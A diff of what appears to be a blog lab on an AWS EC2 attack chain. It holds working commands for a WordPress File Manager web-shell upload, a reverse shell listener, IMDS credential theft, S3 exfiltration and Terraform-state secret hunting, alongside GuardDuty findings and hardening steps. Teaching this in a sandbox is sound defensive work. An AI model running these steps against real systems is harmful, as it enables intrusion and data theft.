@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — EC2 Attack Chain: Reverse Shell, IMDS Credential Theft, and GuardDuty Detection"
+title: "Lab: EC2 Attack Chain: Reverse Shell, IMDS Credential Theft, and GuardDuty Detection"
 date: 2026-06-20T10:00:00
 categories:
   - AWS Security Labs
@@ -16,7 +16,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab simulating a full EC2 attack chain — WordPress exploitation, reverse shell, IMDS credential theft, S3 exfiltration, and IAM privilege escalation — all observed through GuardDuty findings in real time.
+description: A hands-on lab simulating a full EC2 attack chain - WordPress exploitation, reverse shell, IMDS credential theft, S3 exfiltration, and IAM privilege escalation - all observed through GuardDuty findings in real time.
 toc: true
 pin: false
 math: false
@@ -60,7 +60,7 @@ Attacker uses stolen credentials externally
     │  Step 4: Enumerate and exfiltrate S3 buckets
     │  Step 5: Escalate privileges via IAM misconfig
     ▼
-Full account compromise — GuardDuty fires throughout
+Full account compromise - GuardDuty fires throughout
 ```
 
 ---
@@ -70,7 +70,7 @@ Full account compromise — GuardDuty fires throughout
 - An AWS account you fully own (use a dedicated lab/sandbox account, not production)
 - Basic Linux command line familiarity
 - GuardDuty enabled before you start
-- Budget: this lab uses 2 EC2 instances (t3.micro) — expect under $2 if you terminate promptly
+- Budget: this lab uses 2 EC2 instances (t3.micro) - expect under $2 if you terminate promptly
 
 ---
 
@@ -79,19 +79,19 @@ Full account compromise — GuardDuty fires throughout
 ```
 VPC: 10.0.0.0/16
 ├── Public Subnet: 10.0.1.0/24
-│   ├── Attacker EC2 (Kali Linux) — 10.0.1.10
-│   └── Victim EC2 (WordPress)   — 10.0.1.20
+│   ├── Attacker EC2 (Kali Linux) - 10.0.1.10
+│   └── Victim EC2 (WordPress)   - 10.0.1.20
 └── S3 Bucket (target for exfiltration)
 ```
 
 Both instances in the same public subnet to keep networking simple.
-In a real attack, the attacker would be external — but this lets you focus on the technique.
+In a real attack, the attacker would be external - but this lets you focus on the technique.
 
 ---
 
-## Phase 0 — Setup
+## Phase 0: Setup
 
-### Step 0.1 — Enable GuardDuty
+### Step 0.1: Enable GuardDuty
 
 Do this first so it captures every event from the beginning.
 
@@ -106,7 +106,7 @@ aws guardduty create-detector \
 
 ---
 
-### Step 0.2 — Create a Test S3 Bucket with Fake Sensitive Data
+### Step 0.2: Create a Test S3 Bucket with Fake Sensitive Data
 
 ```bash
 # Create the bucket
@@ -127,12 +127,12 @@ aws s3 cp payment-data.txt s3://lab-target-bucket-ACCOUNTID/
 
 ---
 
-### Step 0.3 — Create an Overprivileged IAM Role for the Victim EC2
+### Step 0.3: Create an Overprivileged IAM Role for the Victim EC2
 
-This simulates a real-world misconfiguration — the WordPress server has way more permissions than it needs.
+This simulates a real-world misconfiguration - the WordPress server has way more permissions than it needs.
 
 ```bash
-# Trust policy — EC2 can assume this role
+# Trust policy: EC2 can assume this role
 cat > trust-policy.json << 'EOF'
 {
   "Version": "2012-10-17",
@@ -171,10 +171,10 @@ aws iam add-role-to-instance-profile \
 
 ---
 
-### Step 0.4 — Launch the Victim EC2 (WordPress)
+### Step 0.4: Launch the Victim EC2 (WordPress)
 
 Use an old WordPress AMI or deploy WordPress on Amazon Linux 2 with a vulnerable plugin.
-For this lab, deploy WordPress with the **File Manager** plugin (CVE-2020-25213 — unauthenticated RCE).
+For this lab, deploy WordPress with the **File Manager** plugin (CVE-2020-25213 - unauthenticated RCE).
 
 ```bash
 # Launch victim EC2 with the overprivileged role attached
@@ -199,7 +199,7 @@ aws ec2 run-instances \
   '
 ```
 
-Security group for victim — allows HTTP from anywhere, SSH from your IP only:
+Security group for victim - allows HTTP from anywhere, SSH from your IP only:
 
 ```
 Inbound:  80/tcp   0.0.0.0/0   (WordPress)
@@ -207,11 +207,11 @@ Inbound:  22/tcp   YOUR_IP/32  (admin access)
 Outbound: ALL      0.0.0.0/0   (needed for reverse shell callback)
 ```
 
-> 📸 **SCREENSHOT:** EC2 console showing both instances running — victim-wordpress and attacker-kali
+> 📸 **SCREENSHOT:** EC2 console showing both instances running - victim-wordpress and attacker-kali
 
 ---
 
-### Step 0.5 — Launch the Attacker EC2 (Kali Linux)
+### Step 0.5: Launch the Attacker EC2 (Kali Linux)
 
 ```bash
 # Kali Linux is available in AWS Marketplace
@@ -225,7 +225,7 @@ aws ec2 run-instances \
   --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=attacker-kali}]'
 ```
 
-Security group for attacker — allows inbound on the reverse shell port:
+Security group for attacker - allows inbound on the reverse shell port:
 
 ```
 Inbound:  4444/tcp  0.0.0.0/0   (reverse shell listener)
@@ -241,17 +241,17 @@ ssh -i lab-keypair.pem kali@KALI_PUBLIC_IP
 
 ---
 
-## Phase 1 — Initial Access: WordPress RCE
+## Phase 1: Initial Access: WordPress RCE
 
-### Step 1.1 — Confirm the Vulnerable Plugin
+### Step 1.1: Confirm the Vulnerable Plugin
 
 Navigate to `http://VICTIM_IP/wp-admin/plugins.php` and confirm **File Manager 6.8** is installed and active.
 
-The vulnerability (CVE-2020-25213) allows unauthenticated file upload through the plugin's connector endpoint — no login required.
+The vulnerability (CVE-2020-25213) allows unauthenticated file upload through the plugin's connector endpoint - no login required.
 
 > 📸 **SCREENSHOT:** WordPress admin panel showing File Manager plugin version 6.8 active
 
-### Step 1.2 — Upload a PHP Web Shell
+### Step 1.2: Upload a PHP Web Shell
 
 From Kali, create a minimal PHP web shell:
 
@@ -269,20 +269,20 @@ curl -s -X POST \
   -F "upload[]=@shell.php;type=image/jpeg"
 ```
 
-Test RCE — the victim server runs your command:
+Test RCE - the victim server runs your command:
 
 ```bash
 curl "http://VICTIM_IP/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
 # Returns: uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-> 📸 **SCREENSHOT:** Terminal showing the curl response with `uid=48(apache)` — confirming RCE
+> 📸 **SCREENSHOT:** Terminal showing the curl response with `uid=48(apache)` - confirming RCE
 
 ---
 
-## Phase 2 — Reverse Shell
+## Phase 2: Reverse Shell
 
-### Step 2.1 — Start the Listener on Kali
+### Step 2.1: Start the Listener on Kali
 
 ```bash
 # On Kali attacker EC2
@@ -291,7 +291,7 @@ nc -lvnp 4444
 
 > 📸 **SCREENSHOT:** Terminal showing `listening on [any] 4444 ...`
 
-### Step 2.2 — Trigger the Reverse Shell
+### Step 2.2: Trigger the Reverse Shell
 
 ```bash
 # URL-encode a bash reverse shell and send it via the web shell
@@ -324,13 +324,13 @@ If Kali's IP is in a known threat intelligence list, GuardDuty fires:
 
 ---
 
-## Phase 3 — IMDS Credential Theft
+## Phase 3: IMDS Credential Theft
 
 This is the most impactful step.
 The EC2 Instance Metadata Service (IMDS) is reachable only from inside the instance at `169.254.169.254`.
 Since the victim has an IAM role attached, its temporary credentials are exposed there.
 
-### Step 3.1 — Query the Metadata Service
+### Step 3.1: Query the Metadata Service
 
 ```bash
 # From inside the victim's shell (via reverse shell)
@@ -357,14 +357,14 @@ Output:
 }
 ```
 
-> 📸 **SCREENSHOT:** The curl output showing the JSON with AccessKeyId, SecretAccessKey, and Token — highlight that these are real temporary AWS credentials
+> 📸 **SCREENSHOT:** The curl output showing the JSON with AccessKeyId, SecretAccessKey, and Token - highlight that these are real temporary AWS credentials
 
-### Step 3.2 — Export Credentials on Kali
+### Step 3.2: Export Credentials on Kali
 
 Copy the credentials out and configure them on the attacker machine:
 
 ```bash
-# On Kali — set the stolen credentials as environment variables
+# On Kali: set the stolen credentials as environment variables
 export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
 export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 export AWS_SESSION_TOKEN=AQoDYXdzEJr...
@@ -383,28 +383,55 @@ Output:
 }
 ```
 
-The attacker is now authenticated as the WordPress EC2 role — from their own Kali machine outside the victim instance.
+The attacker is now authenticated as the WordPress EC2 role, from their own Kali machine outside the victim instance.
 
 > 📸 **SCREENSHOT:** `aws sts get-caller-identity` output on Kali showing the stolen role identity
 
-**GuardDuty finding — this is the most important one:**
+### Step 3.3: Run the Same Commands From Outside AWS
+
+**Where you run the stolen credentials from determines which finding fires.** This trips up a lot of write-ups of this attack, including an earlier version of this one.
+
+GuardDuty has two credential exfiltration findings for EC2, and they have narrower trigger conditions than "used somewhere other than the instance":
+
+| Finding | Fires when the credentials are used from |
+|---------|------------------------------------------|
+| `InstanceCredentialExfiltration.OutsideAWS` | A host **outside of AWS entirely** |
+| `InstanceCredentialExfiltration.InsideAWS` | An IP or VPC endpoint owned by a **different AWS account** |
+
+The Kali box in this lab is inside AWS *and* inside the same account as the victim, so it satisfies neither condition. Running the exfiltration from Kali alone will not produce either finding.
+
+To actually trigger `.OutsideAWS`, export the stolen credentials to your own laptop, which is genuinely outside AWS, and run the calls from there:
+
+```bash
+# On your local workstation, NOT on an EC2 instance
+export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+export AWS_SESSION_TOKEN=AQoDYXdzEJr...
+
+aws sts get-caller-identity
+```
 
 ```
 UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
 ```
 
-GuardDuty detects that credentials issued to EC2 instance `i-0abc...` are being used from an IP address that is NOT that instance.
-This is one of GuardDuty's highest-confidence findings — almost always a real incident.
+This is one of GuardDuty's highest-confidence findings, because legitimate workloads have almost no reason to move instance credentials off the instance.
 
-> 📸 **SCREENSHOT:** GuardDuty console showing the InstanceCredentialExfiltration finding with High severity
+Running from Kali is not wasted, though. It triggers a different finding, since GuardDuty fingerprints the operating system making the API call:
+
+```
+PenTest:IAMUser/KaliLinux
+```
+
+> 📸 **SCREENSHOT:** GuardDuty console showing the InstanceCredentialExfiltration.OutsideAWS finding with High severity, generated from the local workstation run
 
 ---
 
-## Phase 4 — S3 Enumeration and Exfiltration
+## Phase 4: S3 Enumeration and Exfiltration
 
 Using the stolen credentials from Kali:
 
-### Step 4.1 — List All Buckets
+### Step 4.1: List All Buckets
 
 ```bash
 aws s3 ls
@@ -418,7 +445,7 @@ Output:
 2026-06-10 14:55:02 terraform-state-bucket
 ```
 
-### Step 4.2 — Enumerate Bucket Contents
+### Step 4.2: Enumerate Bucket Contents
 
 ```bash
 aws s3 ls s3://lab-target-bucket-123456789012 --recursive
@@ -432,7 +459,7 @@ Output:
 2026-06-20 09:01:14        55 payment-data.txt
 ```
 
-### Step 4.3 — Exfiltrate
+### Step 4.3: Exfiltrate
 
 ```bash
 # Download all files
@@ -456,11 +483,11 @@ Exfiltration:S3/ObjectRead.Unusual
 
 ---
 
-## Phase 5 — Privilege Escalation via IAM Misconfiguration
+## Phase 5: Privilege Escalation via IAM Misconfiguration
 
-The wordpress-ec2-role has `IAMReadOnlyAccess` — so the attacker can enumerate all IAM users, roles, and policies to find a path to more access.
+The wordpress-ec2-role has `IAMReadOnlyAccess` - so the attacker can enumerate all IAM users, roles, and policies to find a path to more access.
 
-### Step 5.1 — Enumerate IAM
+### Step 5.1: Enumerate IAM
 
 ```bash
 # List all IAM users
@@ -476,7 +503,7 @@ aws iam list-attached-role-policies --role-name admin-role
 aws iam list-access-keys --user-name admin-user
 ```
 
-### Step 5.2 — Exploit if S3FullAccess Includes Terraform State
+### Step 5.2: Exploit if S3FullAccess Includes Terraform State
 
 If a Terraform state bucket exists, it often contains plaintext secrets and resource configs:
 
@@ -490,9 +517,9 @@ cat terraform.tfstate | python3 -m json.tool | grep -i "password\|secret\|key"
 
 > 📸 **SCREENSHOT:** Terraform state file contents with sensitive values highlighted
 
-### Step 5.3 — Use Pacu for Structured Escalation
+### Step 5.3: Use Pacu for Structured Escalation
 
-**Pacu** is an open-source AWS exploitation framework — the cloud equivalent of Metasploit:
+**Pacu** is an open-source AWS exploitation framework - the cloud equivalent of Metasploit:
 
 ```bash
 # Install Pacu on Kali
@@ -529,7 +556,7 @@ Discovery:IAMUser/AnomalousBehavior
 
 ---
 
-## Phase 6 — Review All GuardDuty Findings
+## Phase 6: Review All GuardDuty Findings
 
 Now look at everything GuardDuty captured during the lab:
 
@@ -556,7 +583,8 @@ Expected findings summary:
 | Attack Step | GuardDuty Finding | Severity |
 |-------------|-------------------|----------|
 | Reverse shell callback | `Backdoor:EC2/C&CActivity.B` | High |
-| IMDS theft used externally | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` | High |
+| Stolen credentials used from your laptop (outside AWS) | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` | High |
+| Stolen credentials used from the Kali EC2 box | `PenTest:IAMUser/KaliLinux` | Medium |
 | S3 bucket listing | `Discovery:S3/BucketEnumeration.Unusual` | Medium |
 | S3 data download | `Exfiltration:S3/ObjectRead.Unusual` | High |
 | IAM enumeration | `Discovery:IAMUser/AnomalousBehavior` | Medium |
@@ -566,11 +594,11 @@ Expected findings summary:
 
 ---
 
-## Hardening — Fix Every Attack Vector
+## Hardening: Fix Every Attack Vector
 
-### Fix 1 — Enforce IMDSv2 (Blocks IMDS Credential Theft)
+### Fix 1: Enforce IMDSv2 (Blocks IMDS Credential Theft)
 
-IMDSv2 requires a session token to query the metadata service — a simple `curl` no longer works.
+IMDSv2 requires a session token to query the metadata service - a simple `curl` no longer works.
 
 ```bash
 # Enforce IMDSv2 on an existing instance
@@ -600,15 +628,15 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" \
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
-The hop limit of 1 means the token cannot be retrieved from inside a container or via SSRF — only directly on the host.
+The hop limit of 1 means the token cannot be retrieved from inside a container or via SSRF - only directly on the host.
 
 > 📸 **SCREENSHOT:** EC2 console → Instance → Actions → Modify instance metadata options showing HttpTokens: required
 
 ---
 
-### Fix 2 — Apply Least Privilege to the EC2 Role
+### Fix 2: Apply Least Privilege to the EC2 Role
 
-The WordPress server only needed to read from one specific S3 path — not `S3FullAccess`:
+The WordPress server only needed to read from one specific S3 path - not `S3FullAccess`:
 
 ```json
 {
@@ -621,11 +649,11 @@ The WordPress server only needed to read from one specific S3 path — not `S3Fu
 }
 ```
 
-Remove `IAMReadOnlyAccess` entirely — a web server has no business reading IAM.
+Remove `IAMReadOnlyAccess` entirely - a web server has no business reading IAM.
 
 ---
 
-### Fix 3 — Restrict Outbound Traffic (Blocks Reverse Shell)
+### Fix 3: Restrict Outbound Traffic (Blocks Reverse Shell)
 
 The reverse shell worked because the victim EC2 had unrestricted outbound access.
 Add a NACL or security group rule to restrict outbound to only what the app needs:
@@ -638,7 +666,7 @@ Outbound deny:  ALL      0.0.0.0/0   (block everything else)
 
 ---
 
-### Fix 4 — Enable S3 Block Public Access and Bucket Policies
+### Fix 4: Enable S3 Block Public Access and Bucket Policies
 
 ```bash
 # Block all public access at account level
@@ -670,9 +698,9 @@ aws s3api put-bucket-policy \
 
 ---
 
-### Fix 5 — GuardDuty Automated Response via EventBridge
+### Fix 5: GuardDuty Automated Response via EventBridge
 
-Don't just alert — automatically respond when the credential exfiltration finding fires:
+Don't just alert - automatically respond when the credential exfiltration finding fires:
 
 ```json
 {
@@ -685,7 +713,7 @@ Don't just alert — automatically respond when the credential exfiltration find
 ```
 
 EventBridge target: Lambda function that:
-1. Revokes the session — attaches a deny-all inline policy to the role
+1. Revokes the session - attaches a deny-all inline policy to the role
 2. Notifies the security team via SNS
 3. Snapshots the EC2 instance for forensics
 4. Tags the instance as `Quarantine: true`
@@ -694,7 +722,7 @@ EventBridge target: Lambda function that:
 
 ## Cleanup
 
-**Important — terminate everything after the lab to avoid charges:**
+**Important - terminate everything after the lab to avoid charges:**
 
 ```bash
 # Terminate both EC2 instances
@@ -728,11 +756,11 @@ aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
 
 ## Key Takeaways
 
-- **IMDS is the crown jewel** — any RCE on an EC2 with an IAM role attached immediately gives the attacker AWS credentials
-- **IMDSv2 is the single most important hardening step** — it breaks this entire attack chain at step 3
-- **GuardDuty's credential exfiltration finding is extremely reliable** — it fires when instance credentials are used from outside AWS or from a different IP than the instance
-- **Least privilege is the second line of defense** — even if credentials are stolen, a tightly scoped role limits what the attacker can do with them
-- **Outbound traffic restrictions are underused** — most teams lock down inbound but ignore outbound, which is what reverse shells rely on
+- **IMDS is the crown jewel** - any RCE on an EC2 with an IAM role attached immediately gives the attacker AWS credentials
+- **IMDSv2 is the single most important hardening step** - it breaks this entire attack chain at step 3
+- **GuardDuty's credential exfiltration finding is extremely reliable, but read its trigger condition carefully.** `.OutsideAWS` needs the credentials used from a host outside AWS entirely, `.InsideAWS` needs a different AWS account. Using them from another instance in the same account fires neither, which is the detail that makes or breaks this lab
+- **Least privilege is the second line of defense** - even if credentials are stolen, a tightly scoped role limits what the attacker can do with them
+- **Outbound traffic restrictions are underused** - most teams lock down inbound but ignore outbound, which is what reverse shells rely on
 
 ---
 
